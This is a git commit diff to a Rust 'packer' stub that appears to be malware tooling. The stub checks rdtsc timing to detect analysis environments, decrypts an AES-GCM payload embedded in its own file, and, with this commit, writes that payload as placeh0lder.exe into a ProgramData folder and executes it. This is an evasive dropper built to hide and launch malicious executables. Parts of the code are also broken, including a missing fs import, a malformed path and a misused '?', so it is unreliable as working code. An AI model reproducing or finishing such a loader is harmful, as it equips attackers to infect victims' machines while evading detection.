d468c737e221303b576360454ed43c341e2c6583
Afloofe <Afunnyfloof@proton.me>
2025-07-02 13:34:09 -0500

    Finished packer (fr this time

--- stub/src/main.rs
+++ stub/src/main.rs
@@ -1,7 +1,6 @@
 use aes_gcm::Aes256Gcm;
 use aes_gcm::KeyInit;
 use aes_gcm::aead::{AeadInPlace, generic_array::GenericArray};
-use std::io;
 use std::io::prelude::*;
 use std::fs::File;
 use std::env;
@@ -10,12 +9,13 @@ use base64::{engine::general_purpose, Engine as _};
 use core::arch::x86_64::{__cpuid, _rdtsc};
 use std::process;
 use std::error::Error;
+use std::process::Command;
 
 fn main() -> Result<(), Box<dyn Error>> {
     if rdt() {
         let _ = File::open("asdfasfefh543t9384ghrwe98f3e4h7gt548983rejfhgt7854rf04j853");
-        panic!("womp");
         process::exit(1);
+        panic!("womp");
     } 
 
 //Get the vars to decrypt data
@@ -33,7 +33,7 @@ fn main() -> Result<(), Box<dyn Error>> {
     //Convert to genarr
     let key_form = GenericArray::from_slice(&key_dec);
     let nonce_form = GenericArray::from_slice(&nonce_dec);
-    let size_form: i64= size.parse()?;
+    let size_form: i64 = size.parse()?;
     
     //Open and read self
     let mut buffer = Vec::new();
@@ -45,9 +45,12 @@ fn main() -> Result<(), Box<dyn Error>> {
     let cipher = Aes256Gcm::new(&key_form);  
     let _ = cipher.decrypt_in_place(&nonce_form, b"", &mut buffer);
     
-    //Output (will change later)
-    let mut output = File::create("decrypted.txt")?;
-    let _ = output.write_all(&buffer);
+    let _ = fs::create_dir("%ProgramData%\\placeh0lder")?;
+    let _ = env::set_current_dir("%ProgramData\\placeh0lder")?;
+
+    let mut out = File::create("placeh0lder.exe")?;
+    let _ = out.write_all(&buffer);
+    let run = Command::new(".\\placeh0lder.exe")?;
 
     Ok(()) 
 
@@ -74,4 +77,5 @@ fn rdt() -> bool {
     let avg = sum / iter;
     avg > 500
 }
+
 
